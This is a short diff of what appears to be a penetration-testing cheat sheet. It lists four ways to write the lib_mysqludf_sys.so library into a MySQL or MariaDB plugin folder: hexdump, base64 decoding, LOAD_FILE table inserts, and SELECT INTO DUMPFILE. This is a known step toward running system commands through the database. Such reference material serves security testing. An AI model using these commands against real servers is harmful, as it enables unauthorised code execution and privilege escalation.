@@ -17,9 +17,11 @@ functions:
 
         Method 1: copy 
           Copy the udf.so into the plugin folder
+          
         Method 2: perform a hexdump
           od -A n -t x1 lib_mysqludf_sys.so | sed 's/ *//g' | tr -d '\n' | xclip
           select <hex> into dumpfile "<plugin folder>/udf.so";
+
         Method 3: perform a base64 encoded  (IF MARIADB 5.6+)
           base64 <file> -w 0 > <file>.b64
           base64 -w 0 myudf.so > myudf.b64
@@ -27,6 +29,7 @@ functions:
 
           set @lib = "<base64>";
           select from_base64(@lib) into dumpfile "<plugin folder>/udf.so";
+
         Method 4: transfer file via table inserts  (easiest)
           create table foo(line blob);insert into foo values(load_file('/tmp/myudf.so'));select * from foo into dumpfile "<plugin folder>/udf.so";
 
